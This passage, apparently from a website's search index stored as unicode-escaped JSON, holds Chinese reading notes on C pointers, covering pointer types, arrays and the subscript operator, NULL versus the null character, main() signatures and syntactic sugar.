\u56e0\u4e3a\u201c\u6307\u9488\u7c7b\u578b\u201d\u662f\u7c7b\u578b\uff0c\u6240\u4ee5\u5b83\u548cint\u7c7b\u578b\u3001double\u7c7b\u578b\u4e00\u6837\uff0c\u4e5f\u5b58\u5728\u201c\u6307\u9488\u7c7b\u578b\u53d8\u91cf\u201d\u548c\u201c\u6307\u9488\u7c7b\u578b\u7684\u503c\u201d\u3002\u7cdf\u7cd5\u7684\u662f\uff0c\u201c\u6307\u9488\u7c7b\u578b\u201d\u3001\u201c\u6307\u9488\u7c7b\u578b\u53d8\u91cf\u201d\u548c\u201c\u6307\u9488\u7c7b\u578b\u7684\u503c\u201d\u7ecf\u5e38\u88ab\u7b80\u5355\u5730\u7edf\u79f0\u4e3a\u201c\u6307\u9488\u201d\uff0c\u6240\u4ee5\u975e\u5e38\u5bb9\u6613\u9020\u6210\u6b67\u4e49\uff0c\u8fd9\u4e00\u70b9\u9700\u8981\u63d0\u9ad8\u8b66\u60d5\u3002 \u8981\u70b9 \u5148\u6709\u201c\u6307\u9488\u7c7b\u578b\u201d\u3002 \u56e0\u4e3a\u6709\u4e86\u201c\u6307\u9488\u7c7b\u578b\u201d\uff0c\u6240\u4ee5\u6709\u4e86\u201c\u6307\u9488\u7c7b\u578b\u7684\u53d8\u91cf\u201d\u548c\u201c\u6307\u9488\u7c7b\u578b\u7684\u503c\u201d\u3002 \u6bd4\u5982\uff0c\u5728C\u4e2d\uff0c\u4f7f\u7528int\u7c7b\u578b\u8868\u793a\u6574\u6570\u3002\u56e0\u4e3aint\u662f\u201c\u7c7b\u578b\u201d\uff0c\u6240\u4ee5\u5b58\u5728\u7528\u4e8e\u4fdd\u5b58int\u578b\u7684\u53d8\u91cf\uff0c\u5f53\u7136\u4e5f\u5b58\u5728int\u578b\u7684\u503c\u3002 \u6307\u9488\u7c7b\u578b\u540c\u6837\u5982\u6b64\uff0c\u65e2\u5b58\u5728\u6307\u9488\u7c7b\u578b\u7684\u53d8\u91cf\uff0c\u4e5f\u5b58\u5728\u6307\u9488\u7c7b\u578b\u7684\u503c\u3002 \u56e0\u6b64\uff0c\u51e0\u4e4e\u6240\u6709\u7684\u5904\u7406\u7a0b\u5e8f\u4e2d\uff0c\u6240\u8c13\u7684\u201c\u6307\u9488\u7c7b\u578b\u7684\u503c\u201d\uff0c\u5b9e\u9645\u662f\u6307 \u5185\u5b58\u7684\u5730\u5740 \u3002 \u4e5f\u4e0d\u77e5\u9053\u6458\u8fd9\u4e48\u957f\u4e00\u6bb5\u51fa\u6765\u6709\u6ca1\u6709\u4eba\u770b...\u4e3b\u8981\u662f\u633a\u7ecf\u5e38\u8981\u8ddf \u5927\u4e8c \u7684\u5b66\u751f\u89e3\u91ca\u8fd9\u4e2a\u95ee\u9898\uff1a\u201c\u6307\u9488\u7c7b\u578b\u201d\u662f\u7531\u5176\u5b83\u7c7b\u578b\u6d3e\u751f\u800c\u6210\u7684\uff0c\u800c\u975e\u6307\u5411\u4efb\u4f55\u4e0d\u540c\u5bf9\u8c61\u7684\u6307\u9488\u90fd\u662f\u540c\u4e00\u79cd\u7c7b\u578b\uff08\u597d\u5427\u8fd9\u540e\u534a\u53e5\u6211\u4e5f\u89e3\u91ca\u4e0d\u6e05\u695a\uff0c\u8c01\u8ba9\u6211\u6839\u672c\u4e0d\u77e5\u9053\u5404\u4f4d\u540c\u5b66\u662f\u600e\u4e48\u88ab\u6559\u574f\u7684\u5462\uff09\u3002 \u8fd8\u6709\u4e2a\u66f4\u8981\u547d\u7684\u95ee\u9898\u5c31\u662f...\u5b66\u6821\u7684\u4e60\u9898\u57fa\u672c\u4e0a\u662f\u8ba9\u4f60\u62ff\u51e0\u4e2a\u6307\u9488\u5904\u7406\u5404\u79cd\u6570\u7ec4\u548c\u5b57\u7b26\u4e32\uff0c\u4e5f\u4e0d\u8bb2\u8bb2\u6307\u9488\u548c\u6570\u7ec4\u4e4b\u95f4\u7684\u533a\u522b\uff0c\u6700\u540e\u6211\u770b\u5230\u7684\u90fd\u662f\u4e00\u5806\u98ce\u683c\u5947\u5dee\u7684\u4ee3\u7801\u548c\u5404\u79cd\u7c7b\u578b\u4e0d\u5339\u914d...\uff08\u644a\u624b.jpg\uff09 \u540e\u7eed\u6162\u6162\u6765\u8c08\u4e0a\u9762\u7684\u8fd9\u4e9b\u95ee\u9898\uff0c\u7279\u522b\u662f\u8bed\u6cd5\u7cd6\u4e4b\u7c7b\u7684\u90e8\u5206\u3002 1.2.2 \u548c\u6307\u9488\u7684\u7b2c\u4e00\u6b21\u4eb2\u5bc6\u63a5\u89e6 Page 19 \u524d\u9762\u66fe\u7ecf\u63d0\u5230\uff0c\u56e0\u4e3a\u5b58\u5728\u201c\u6307\u9488\u7c7b\u578b\u201d\uff0c\u6240\u4ee5\u5b58\u5728\u201c\u6307\u9488\u7c7b\u578b\u7684\u53d8\u91cf\u201d\u548c\u201c\u6307\u9488\u7c7b\u578b\u7684\u503c\u201d\u3002\u8fd9\u91cc\u8f93\u51fa\u7684\u201c\u5730\u5740\u201d\uff0c\u662f\u6307\u201c\u6307\u9488\u7c7b\u578b\u7684\u503c\u201d\u3002 \u53e6\u5916\uff0c\u4ee5\u4e0a\u7684\u4f8b\u5b50\u5728\u4f7f\u7528printf()\u8f93\u51fa\u6307\u9488\u7684\u503c\u65f6\uff0c\u4f7f\u7528\u4e86\u53c2\u6570%p\u3002\u5f88\u591a\u4eba\u90fd\u4f7f\u7528\u8fc7%x \u8fd9\u6837\u7684\u53c2\u6570\u3002\u9057\u61be\u7684\u662f\uff0c\u8fd9\u79cd\u4f7f\u7528\u65b9\u5f0f\u662f \u9519\u8bef \u7684\u3002\u5173\u4e8e\u8fd9\u70b9\u7684\u89e3\u91ca\uff0c\u8bf7\u53c2\u71671.2.3\u8282\u3002 \u8865\u5145 \u5173\u4e8eint main(void) Page 22 \u5728C\u8bed\u8a00\u6807\u51c6\u4e2d\uff0c\u5173\u4e8emain()\u51fd\u6570\u7684\u4f7f\u7528\u53ea\u6709\u5982\u4e0b\u4e24\u79cd\u65b9\u5f0f\uff1a int main(int argc, char *argv[]) \u6216\u8005 int main(void) \u5c3d\u7ba1\u5982\u6b64\uff0c\u8fd8\u662f\u53ef\u4ee5\u5728\u4e00\u4e9b\u5165\u95e8\u4e66\u7c4d\u4e2d\u9047\u5230 void main(void) \u8fd9\u6837\u7684\u5199\u6cd5\uff0c \u8fd9\u662f\u9519\u8bef\u7684 \u3002\u786e\u5b9e\uff0c\u5c31\u7b97\u662f\u8fd9\u4e48\u5199\uff0c\u5f88\u591a\u7a0b\u5e8f\u4e5f\u80fd\u52a8\u8d77\u6765\u3002\u4f46\u662f\u5728\u6709\u4e9b\u73af\u5883\u4e0b\uff0c\u7f16\u8bd1\u5668\u53ef\u80fd\u4f1a\u62a5\u544a\u4e00\u4e9b\u8b66\u544a\u4fe1\u606f\u3002 main \u51fd\u6570\u8fd4\u56de\u4e00\u4e2a int \u7c7b\u578b\u7684\u503c\uff0c\u56e0\u6b64\u5728\u5904\u7406\u7684\u6700\u540e\u5fc5\u987b\u6709 return \uff08\u73b0\u5728\u7684\u5f88\u591a\u7f16\u8bd1\u5668\u90fd\u4f1a\u63d0\u793a\u6ca1\u6709return\u7684\u8b66\u544a\uff09\u3002 \u672c\u4e66\u6240\u6709\u4f8b\u7a0b\u7684 main \u51fd\u6570\u7684\u672b\u5c3e\u90fd\u5199\u4e86 return 0\uff1b\u3002 \u8fd4\u56de0\u8868\u793a\u901a\u77e5\u8fd0\u884c\u73af\u5883\u7a0b\u5e8f\u201c\u6b63\u5e38\u7ed3\u675f\u201d\u3002 \u8865\u5145 NULL\u30010\u548c'\\0' Page 28 \u7ecf\u5e38\u6709\u4e00\u79cd\u9519\u8bef\u7684\u7a0b\u5e8f\u5199\u6cd5\uff1a\u4f7f\u7528NULL\u6765\u7ed3\u675f\u5b57\u7b26\u4e32\u3002 /* \u901a\u5e38\uff0cC\u7684\u5b57\u7b26\u4e32\u4f7f\u7528'\\0'\u7ed3\u5c3e\uff0c\u53ef\u662f\u56e0\u4e3astrnpy()\u51fd\u6570\u5728src\u7684\u957f\u5ea6\u5927\u4e8elen\u7684\u60c5\u51b5\u4e0b\u6ca1\u6709\u4f7f\u7528'\\0'\u6765\u7ed3\u675f\uff0c\u6240\u4ee5\u4e00\u677f\u4e00\u773c\u5730\u5199\u4e86\u4e00\u4e2a\u6574\u7406\u6210C\u7684\u5b57\u7b26\u4e32\u5f62\u5f0f\u7684\u51fd\u6570\uff08\u4f01\u56fe\uff09 */ void my_strncpy(char *dest, char *src, int len) { strncpy(dest, src, len); dest[len] = NULL; \u2190\u4f7f\u7528NULL\u6765\u7ed3\u675f\u5b57\u7b26\u4e32\uff01\uff01 } \u4e0a\u9762\u7684\u4ee3\u7801\uff0c\u5c3d\u7ba1\u5728\u67d0\u4e9b\u8fd0\u884c\u73af\u5883\u4e0b\u80fd\u8dd1\u8d77\u6765\uff0c\u4f46\u65e0\u8bba\u600e\u6837\u5b83\u5c31\u662f\u9519\u8bef\u7684\u3002\u56e0\u4e3a\u5b57\u7b26\u4e32\u662f\u4f7f\u7528\u201c\u7a7a\u5b57\u7b26\u201d\u6765\u7ed3\u675f\u7684\uff0c\u800c\u4e0d\u662f\u7528\u7a7a\u6307\u9488\u6765\u7ed3\u675f\u3002 \u5728C\u8bed\u8a00\u6807\u51c6\u4e2d\uff0c\u7a7a\u5b57\u7b26\u7684\u5b9a\u4e49\u4e3a\u201c\u6240\u6709\u7684\u4f4d\u4e3a0\u7684\u5b57\u8282\u79f0\u4e3a \u7a7a\u5b57\u7b26 \uff08null character\uff09\u201d\uff085.2.1\uff09\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u7a7a\u5b57\u7b26\u662f\u503c\u4e3a0\u7684\u5b57\u7b26\u3002 \u7a7a\u5b57\u7b26\u5728\u8868\u73b0\u4e0a\u901a\u5e38\u4f7f\u7528'\\0'\u3002\u56e0\u4e3a'\\0'\u662f\u5e38\u91cf\uff0c\u6240\u4ee5\u5b9e\u9645\u4e0a\u5b83\u7b49\u540c\u4e8e0\u3002\u4e5f\u8bb8\u6709\u4e9b\u5413\u5230\u4f60\u4e86\uff0c'\\0'\u5440'a'\u5440\u4ec0\u4e48\u7684\uff0c\u5b83\u4eec\u7684\u6570\u636e\u7c7b\u578b\u5176\u5b9e\u5e76\u4e0d\u662fchar\uff0c\u800c\u662fint\uff08\u6ce8\uff09\u3002 \u6ce8\uff1a\u5982\u679c\u662fC++\uff0c\u5c31\u4e0d\u662f\u8fd9\u4e2a\u7ed3\u8bba\u4e86\u3002 https://stackoverflow.com/questions/433895/why-are-c-character-literals-ints-instead-of-chars 1.2.6 \u5b9e\u8df5\u2014\u2014swap\u51fd\u6570 Page 31 \u8c03\u7528C\u7684\u51fd\u6570\uff0c\u53c2\u6570\u4f20\u9012\u5f80\u5f80\u662f \u4f20\u503c \uff0c\u8fd9\u79cd\u65b9\u5f0f\u4f20\u9012\u7684\u662f\u53c2\u6570\u7684\u526f\u672c\u3002 Page 33 \u8bf4\u4e2a\u9898\u5916\u8bdd\uff0c\u5982\u679c\u4ec5\u4ec5\u662f\u9700\u8981\u4ea4\u6362\u6574\u578b\u53d8\u91cf\u7684\u503c\uff0c\u5b8c\u5168\u4e0d\u4f7f\u7528\u4e34\u65f6\u53d8\u91cf\u4e5f\u662f\u53ef\u4ee5\u7684\u3002\u6bd4\u5982\u4f7f\u7528\u4e0b\u9762\u7684\u5b8f\u5b9a\u4e49\uff1a #define SWAP(a, b) (a += b, b = a - b, a -= b) \u5728\u8fd9\u79cd\u65b9\u5f0f\uff08\u8fd8\u53ef\u4ee5\u4f7f\u7528\u5f02\u6216\u8fd0\u7b97\u7b26\uff09\u4e0b\uff0c\u5728\u98a0\u5012\u4f7f\u7528\u540c\u4e00\u4e2a\u53d8\u91cf\u65f6\uff0c\u8fd9\u4e2a\u7a0b\u5e8f\u662f\u4e0d\u80fd\u6b63\u5e38\u8fd0\u884c\u7684\u3002\u6bd4\u5982\u4f60\u5199\u4e86SWAP(a[i], a[j])\uff0c\u5e76\u4e14\u6070\u5de7i == j\uff0c\u90a3\u6211\u53ea\u80fd\u606d\u559c\u4f60\u4e2d\u62db\u4e86\u3002\u5f53\u7136\uff0c\u5982\u679c\u4f60\u80fd\u62c5\u4fdd\u8fd9\u79cd\u60c5\u51b5\u6c38\u8fdc\u4e0d\u53ef\u80fd\u51fa\u73b0\uff0c\u4f7f\u7528\u8fd9\u4e2a\u5b8f\u4e5f\u672a\u5c1d\u4e0d\u53ef\u3002 \u8865\u5145 \u5f62\u53c2\u548c\u5b9e\u53c2 Page 33 \u51e0\u4e4e\u6240\u6709\u7684 C\u8bed\u8a00\u7684\u5165\u95e8\u4e66\u7c4d\u4e2d\uff0c\u90fd\u4f1a\u8bb2\u89e3\u201c\u5f62\u53c2\u201d\u548c\u201c\u5b9e\u53c2\u201d\u7684\u6982\u5ff5\u3002\u4f46\u662f\u5b83\u4eec\u8fd8\u662f\u7ecf\u5e38\u88ab\u8f7b\u6613\u6df7\u6dc6\u3002 \u5b9e\u53c2 \u662f\u8c03\u7528\u51fd\u6570\u65f6\u7684\u53c2\u6570\u3002 func(5); \u2190\u8fd9\u91cc\u76845\u662f\u5b9e\u53c2\u3002 \u5f62\u53c2 \u662f\u63a5\u53d7\u5b9e\u53c2\u7684\u4e00\u65b9\u3002 void func(int hoge) \u2190\u8fd9\u91cc\u7684hoge\u662f\u5f62\u53c2 { } 1.3.3 \u4e0b\u6807\u8fd0\u7b97\u7b26[]\u548c\u6570\u7ec4\u662f\u6ca1\u6709\u5173\u7cfb\u7684 Page 39 \u5728\u524d\u4e00\u5c0f\u8282\u7684\u201c\u6539\u5199\u7248\u201d\u4f8b\u7a0b\u4e2d\uff0c\u50cf\u4e0b\u9762\u8fd9\u6837\u5c06\u6307\u9488\u6307\u5411\u6570\u7ec4\u7684\u521d\u59cb\u5143\u7d20\u3002 p = &array[0]; \u5176\u5b9e\u4e5f\u53ef\u4ee5\u5199\u6210\u4e0b\u9762\u8fd9\u6837\uff1a p = array; \u5bf9\u4e8e\u8fd9\u79cd\u5199\u6cd5\uff0c\u5f88\u591aC\u8bed\u8a00\u7684\u5165\u95e8\u4e66\u7c4d\u662f\u8fd9\u6837\u8bf4\u660e\u7684\uff1a \u5728 C\u4e2d\uff0c\u5982\u679c\u5728\u6570\u7ec4\u540d\u540e\u4e0d\u52a0[]\uff0c\u5355\u72ec\u5730\u53ea\u5199\u6570\u7ec4\u540d\uff0c\u90a3\u4e48\u6b64\u540d\u79f0\u5c31\u8868\u793a\u201c\u6307\u5411\u6570\u7ec4\u521d\u59cb\u5143\u7d20\u7684\u6307\u9488\u201d\u3002 \u5728\u8fd9\u91cc\uff0c\u6211\u53ef\u4ee5\u8d1f\u8d23\u5730\u544a\u8bc9\u4f60\uff0c\u4e0a\u9762\u7684\u8bf4\u660e\u662f\u9519\u8bef\u7684*\u3002 * \u5982\u679c\u8003\u8651\u7ed9\u4eba\u7559\u70b9\u9762\u5b50\uff0c\u5176\u5b9e\u6211\u5e94\u8be5\u8fd9\u4e48\u8bf4\uff1a\u201d\u4e0d\u80fd\u8bf4\u8fd9\u4e2a\u8bf4\u660e\u603b\u662f\u5bf9\u7684\u3002\u201c\u53ef\u662f\u8003\u8651\u4e00\u4e0b\u542c\u5230\u8fd9\u4e2a\u8bf4\u660e\u7684\u4eba\u5982\u4f55\u89e3\u91ca\u5b83\uff0c\u5c31\u611f\u89c9\u8fd8\u4e0d\u5982\u75db\u75db\u5feb\u5feb\u5730\u6307\u51fa\u6765\u201d\u8fd9\u4e2a\u8bf4\u660e\u5b8c\u5168\u662f\u9519\u8bef\u7684\u201c\u3002 \u53c8\u60ca\u7740\u4f60\u4e86\u5427\uff1f \u5728 C\u7684\u4e16\u754c\u91cc\uff0c\u4e8b\u5230\u5982\u4eca\u4f60\u518d\u53bb\u5426\u5b9a\u201c\u6570\u7ec4\u540d\u540e\u4e0d\u52a0[]\uff0c\u5c31\u4ee3\u8868\u6307\u5411\u521d\u59cb\u5143\u7d20\u7684\u6307\u9488\u201d\u8fd9\u4e2a\u201c\u5f3a\u5927\u7684\u201d \u8bef\u89e3 \u663e\u5f97\u6709\u70b9\u65e0\u5948\u3002\u5bf9\u4e8e\u8fd9\u79cd\u5df2\u7ecf\u6df1\u5165\u4eba\u5fc3\u7684\u89c2\u70b9\uff0c\u4f60\u7a81\u7136\u653e\u8a00\u5b83\u5176\u5b9e\u662f\u4e2a\u8bef\u89e3\uff0c\u53ef\u80fd\u5f88\u591a\u4eba\u65e0\u6cd5\u63a5\u53d7\u3002\u4e0b\u9762\u8ba9\u6211\u4eec\u4f9d\u6cd5\u6765\u8bc1\u660e\u3002 \u5c06&array[0]\u6539\u5199\u6210array\uff0c\u201c\u6539\u5199\u7248\u201d\u7684\u7a0b\u5e8f\u751a\u81f3\u53ef\u4ee5\u5199\u6210\u4e0b\u9762\u8fd9\u6837\uff1a p = array; \u2190\u53ea\u662f\u6539\u5199\u4e86\u8fd9\u91cc\uff0c\u53ef\u662f\u2026\u2026 for (i = 0; i < 5; i++) { printf(\"%d\\n\", *(p + i)); } \u53e6\u5916\uff0c\u7a0b\u5e8f\u4e2d*(p + i)\u4e5f\u53ef\u4ee5\u5199\u6210 p[i]\u3002 p = array; for (i = 0; i < 5; i++) { printf(\"%d\\n\", p[i]); } \u4e5f\u5c31\u662f\u8bf4\uff0c *(p + i) \u548c p[i] \u662f\u540c\u6837\u7684\u610f\u601d\u3002\u53ef\u4ee5\u8ba4\u4e3a\u540e\u9762\u7684\u5199\u6cd5\u662f\u524d\u9762\u7684\u7b80\u4fbf\u5199\u6cd5\u3002 \u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u6700\u521d\u901a\u8fc7 p = array;\u5b8c\u6210\u4e86\u5411 p \u7684\u8d4b\u503c\uff0c\u4f46\u4e4b\u540e p \u4e00\u76f4\u6ca1\u6709\u53d1\u751f\u66f4\u6539\u3002\u6240\u4ee5\uff0c\u65e9\u77e5\u5982\u6b64\uff0c\u4f55\u5fc5\u5f53\u521d\u504f\u8981\u591a\u58f0\u660e\u4e00\u4e2ap\uff0c\u8fd8\u4e0d\u5982\u4e00\u5f00\u59cb\u5c31\u5199\u6210array\u5462\u3002 for (i = 0; i < 5; i++) { printf(\"%d\\n\", array[i]); } \u5440\uff0c\u597d\u50cf\u53c8\u56de\u53bb\u4e86\u5462\u3002 \u7ed3\u8bba\u5c31\u662f\uff0c p[i] \u8fd9\u79cd\u5199\u6cd5\u53ea\u4e0d\u8fc7\u662f *(p + i) \u8fd9\u79cd\u5199\u6cd5\u7684\u7b80\u4fbf\u5199\u6cd5\uff0c \u9664\u6b64\u4e4b\u5916\uff0c\u5b83\u6beb\u65e0\u610f\u4e49 \u3002array[i]\u548cp[i]\u6709\u4ec0\u4e48\u4e0d\u4e00\u6837\u5417\uff1farray[i]\u4e5f\u53ef\u4ee5\u50cf p[i]\u4e00\u6837\uff0c\u5c06 array \u89e3\u8bfb\u6210\u201c\u6307\u5411\u6570\u7ec4\u7684\u521d\u59cb\u5143\u7d20\u7684\u6307\u9488\u201d\u3002 \u4e5f\u5c31\u662f\u8bf4\uff0c\u5b58\u5728 int array[5]; \u8fd9\u6837\u7684\u58f0\u660e\u7684\u65f6\u5019\uff0c\u201c\u4e00\u65e6\u540e\u9762\u4e0d\u8ffd\u52a0[]\uff0c\u53ea\u5199array\u201d\u5e76\u4e0d\u4ee3\u8868\u8981\u4f7farray\u5177\u6709\u6307\u5411\u6570\u7ec4\u7b2c1 \u4e2a\u5143\u7d20\u7684\u6307\u9488\u7684\u542b\u4e49\uff0c\u65e0\u8bba\u52a0\u4e0d\u52a0[]\uff0c\u5728\u8868\u8fbe\u5f0f\u4e2d\uff0c\u6570\u7ec4\u90fd\u53ef\u4ee5\u88ab\u89e3\u8bfb\u6210\u6307\u9488\u3002 \u987a\u4fbf\u8bf4\u4e00\u4e0b\uff0c\u5bf9\u4e8e\u8fd9\u4e2a\u89c4\u5219\u6765\u8bf4\uff0c\u6709\u4e09\u4e2a\u5c0f\u7684\u4f8b\u5916\uff0c\u6211\u4eec\u4f1a\u5728\u7b2c3\u7ae0\u4f5c\u8be6\u7ec6\u8bf4\u660e\u3002 \u4f60\u53ef\u4ee5\u8ba4\u4e3a\u8fd9\u662f\u4e00\u4e2a\u54d7\u4f17\u53d6\u5ba0\u7684\u5f02\u7aef\u90aa\u8bf4\uff0c\u4f46\u81f3\u5c11\u5728\u8bed\u6cd5\u4e0a\uff0c\u6570\u7ec4\u4e0b\u6807\u8fd0\u7b97\u7b26[]\u548c\u6570\u7ec4\u65e0\u5173\u3002 \u8fd9\u91cc\u4e5f\u662fC\u7684\u6570\u7ec4\u4e0b\u6807\u4ece0\u5f00\u59cb\u7684\u7406\u7531\u4e4b\u4e00\u3002 \u8981\u70b9 \u3010\u975e\u5e38\u91cd\u8981\uff01\uff01\u3011 \u8868\u8fbe\u5f0f\u4e2d\uff0c\u6570\u7ec4\u53ef\u4ee5\u89e3\u8bfb\u6210\u201c\u6307\u5411\u5b83\u7684\u521d\u59cb\u5143\u7d20\u7684\u6307\u9488\u201d\u3002\u5c3d\u7ba1\u6709\u4e09\u4e2a\u5c0f\u4f8b\u5916\uff0c\u4f46\u662f\u8fd9\u548c\u5728\u540e\u9762\u52a0\u4e0d\u52a0[]\u6ca1\u6709\u5173\u7cfb\u3002 \u8981\u70b9 p[i]\u662f*(p + i)\u7684\u7b80\u4fbf\u5199\u6cd5\u3002 \u4e0b\u6807\u8fd0\u7b97\u7b26[]\u539f\u672c\u53ea\u6709\u8fd9\u79cd\u7528\u6cd5\uff0c\u5b83\u548c\u6570\u7ec4\u65e0\u5173\u3002 \u9700\u8981\u5f3a\u8c03\u7684\u662f\uff0c\u8ba4\u4e3a[]\u548c\u6570\u7ec4\u6ca1\u6709\u5173\u7cfb\uff0c\u8fd9\u91cc\u7684[]\u662f\u6307\u5728\u8868\u8fbe\u5f0f\u4e2d\u51fa\u73b0\u7684\u4e0b\u6807\u8fd0\u7b97\u7b26[]\u3002 \u58f0\u660e\u4e2d\u7684[]\uff0c\u8fd8\u662f\u8868\u8fbe\u6570\u7ec4\u7684\u610f\u601d\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u58f0\u660e\u4e2d\u7684[]\u548c\u8868\u8fbe\u5f0f\u4e2d\u7684[] \u610f\u4e49\u5b8c\u5168\u4e0d\u540c \u3002\u8868\u8fbe\u5f0f\u4e2d\u7684*\u548c\u58f0\u660e\u4e2d\u7684*\u7684\u610f\u4e49\u4e5f\u662f\u5b8c\u5168\u4e0d\u540c\u7684\u3002\u8fd9\u4e9b\u73b0\u8c61\u4f7f\u5f97 C\u8bed\u8a00\u7684\u58f0\u660e\u5728\u7406\u89e3\u4e0a\u53d8\u5f97\u66f4\u52a0\u6251\u6714\u8ff7\u79bb\u2026\u2026\u5bf9\u6b64\uff0c\u7b2c3\u7ae0\u5c06\u4f1a\u8fdb\u884c\u8be6\u7ec6\u7684\u8bf4\u660e\u3002 \u6b64\u5916\uff0c\u5982\u679c\u5c06 a + b \u6539\u5199\u6210 b + a\uff0c\u8868\u8fbe\u5f0f\u7684\u610f\u4e49\u6ca1\u6709\u53d1\u751f\u6539\u53d8\uff0c\u6240\u4ee5\u4f60\u53ef\u4ee5\u5c06*(p + i)\u5199\u6210*(i + p)\u3002\u5176\u6b21\uff0c\u56e0\u4e3a p[i]\u662f*(p + i)\u7684\u7b80\u4fbf\u5199\u6cd5\uff0c\u5b9e\u9645\u4e0a\u5b83\u4e5f\u53ef\u4ee5\u5199\u6210i[p]\u3002 \u5f15\u7528\u6570\u7ec4\u5143\u7d20\u7684\u65f6\u5019\uff0c\u901a\u5e38\u6211\u4eec\u4f7f\u7528array[5]\u8fd9\u6837\u7684\u5199\u6cd5\u3002\u5176\u5b9e\uff0c\u5c31\u7b97\u4f60\u5199\u6210 5[array]\uff0c\u8fd8\u662f\u53ef\u4ee5\u6b63\u786e\u5730\u5f15\u7528\u5230\u4f60\u60f3\u8981\u7684\u5143\u7d20\u3002\u53ef\u662f\uff0c\u8fd9\u79cd\u5199\u6cd5\u5b9e\u5728\u592a\u53e6\u7c7b\u4e86\uff0c\u5b83\u4e0d\u80fd\u7ed9\u6211\u4eec\u5e26\u6765\u4efb\u4f55\u597d\u5904\u3002 \u8981\u70b9 p[i]\u53ef\u4ee5\u5199\u6210i[p]\u3002 \u8981\u70b9 \u3010\u6bd4\u4e0a\u9762\u8fd9\u4e2a\u8981\u70b9\u66f4\u91cd\u8981\u7684\u8981\u70b9\u3011 \u4f46\u662f\u522b\u5199\u6210\u90a3\u6837\u3002 \u8be6\u7ec6\u5f97\u4e0d\u9700\u8981\u6211\u518d\u5e9f\u8bdd\u4ec0\u4e48\u4e86... \u8865\u5145 \u8bed\u6cd5\u7cd6 Page 42 p[i]\u662f*(p+i)\u7684\u7b80\u5355\u5199\u6cd5\uff0c\u5b9e\u9645\u4e0a\uff0c\u81f3\u5c11\u5bf9\u4e8e\u7f16\u8bd1\u5668\u6765\u8bf4\uff0c[]\u8fd9\u6837\u7684\u8fd0\u7b97\u7b26\u5b8c\u5168\u53ef\u4ee5\u4e0d\u5b58\u5728\u3002 \u53ef\u662f\uff0c\u5bf9\u4e8e\u4eba\u7c7b\u6765\u8bf4\uff0c*(p + i)\u8fd9\u79cd\u5199\u6cd5\u5728\u89e3\u8bfb\u4e0a\u6bd4\u8f83\u56f0\u96be\uff0c\u5199\u8d77\u6765\u4e5f\u9ebb\u70e6\uff08\u952e\u5165\u91cf\u5927\uff09\u3002\u56e0\u6b64\uff0cC\u8bed\u8a00\u5f15\u5165\u4e86[]\u8fd0\u7b97\u7b26\u3002 \u5c31\u50cf\u8fd9\u6837\uff0c\u8fd9\u4e9b\u4ec5\u4ec5\u662f\u4e3a\u4e86\u8ba9\u4eba\u7c7b\u5bb9\u6613\u7406\u89e3\u800c\u5f15\u5165\u7684\u529f\u80fd\uff0c\u7684\u786e\u53ef\u4ee5\u8ba9\u6211\u4eec\u611f\u53d7\u5230\u7f16\u7a0b\u8bed\u8a00\u7684\u751c\u871c\u5473\u9053\uff08\u5bb9\u6613\u7740\u624b\uff09\uff0c\u6709\u65f6\u6211\u4eec\u79f0\u8fd9\u4e9b\u529f\u80fd\u4e3a\u8bed\u6cd5\u7cd6\uff08syntax sugar\u6216\u8005syntactic sugar\uff09\u3002 \u8bed\u6cd5\u7cd6 \u8bed\u6cd5\u76d0","title":"\u7b2c1\u7ae0 \u4ece\u57fa\u7840\u5f00\u59cb\u2014\u2014\u9884\u5907\u77e5\u8bc6\u548c\u590d\u4e60"},{"location":"reading_notes/pointer/1/#118-c","text":"","title":"1.1.8 C\u662f\u53ea\u80fd\u4f7f\u7528\u6807\u91cf\u7684\u8bed\u8a00"},{"location":"reading_notes/pointer/1/#page-15","text":"\u5bf9\u4e8e \u6807\u91cf \uff08scalar\uff09\u8fd9\u4e2a\u8bcd\uff0c\u5927\u5bb6\u53ef\u80fd\u6709\u4e9b\u964c\u751f\u3002 \u7b80\u5355\u5730\u8bf4\uff0c\u6807\u91cf\u5c31\u662f\u6307char\u3001int\u3001double\u548c\u679a\u4e3e\u578b\u7b49\u6570\u503c\u7c7b\u578b\uff0c\u4ee5\u53ca\u6307\u9488\u3002\u76f8\u5bf9\u5730\uff0c\u50cf\u6570\u7ec4\u3001\u7ed3\u6784\u4f53\u548c\u5171\u7528\u4f53\u8fd9\u6837\u7684\u5c06\u591a\u4e2a\u6807\u91cf\u8fdb\u884c\u7ec4\u5408\u7684\u7c7b\u578b\uff0c\u6211\u4eec\u79f0\u4e4b\u4e3a \u805a\u5408\u7c7b\u578b \uff08aggregate\uff09\u3002 \u65e9\u671f\u7684C\u8bed\u8a00 \u4e00\u5ea6\u53ea\u80fd\u4f7f\u7528\u6807\u91cf \u3002 \u7ecf\u5e38\u542c\u5230\u521d\u5b66\u8005\u6709\u4ee5\u4e0b\u7684\u63d0\u95ee\uff1a if (str == \"abc\") \u8fd9\u6837\u7684\u4ee3\u7801\u4e3a\u4ec0\u4e48\u4e0d\u80fd\u6267\u884c\u9884\u671f\u7684\u52a8\u4f5c\u5462\uff1f\u786e\u5b9e\u5df2\u7ecf\u5c06\u201cabc\u201d\u653e\u5230\u4e86str\u4e2d\uff0c\u6761\u4ef6\u8868\u8fbe\u5f0f\u7684\u503c\u5374\u4e0d\u4e3a\u771f\u3002\u8fd9\u662f\u4e3a\u4ec0\u4e48\uff1f \u5bf9\u4e8e\u8fd9\u6837\u7684\u7591\u95ee\uff0c\u901a\u5e38\u7ed9\u51fa\u7684\u7b54\u6848\u662f\u201c\u8fd9\u4e2a\u8868\u8fbe\u5f0f\u4e0d\u662f\u5728\u6bd4\u8f83\u5b57\u7b26\u4e32\u7684\u5185\u5bb9\uff0c\u5b83\u53ea\u662f\u5728\u6bd4\u8f83\u6307\u9488\u201d\uff0c\u5176\u5b9e\u8fd8\u53ef\u4ee5\u7ed9\u51fa\u53e6\u5916\u4e00\u4e2a\u7b54\u6848\uff1a \u5b57\u7b26\u4e32\u5176\u5b9e\u5c31\u662fchar\u7c7b\u578b\u7684 \u6570\u7ec4 \uff0c\u4e5f\u5c31\u662f\u8bf4\u5b83\u4e0d\u662f\u6807\u91cf\uff0c\u5f53\u7136\u5728C\u91cc\u9762\u4e0d\u80fd\u7528==\u8fdb\u884c\u6bd4\u8f83\u4e86\u3002 \u6765\u8ba8\u8bba\u4e00\u4e0b\u8fd9\u4e2a\u95ee\u9898\uff0c\u5bf9\u4e8e(str == 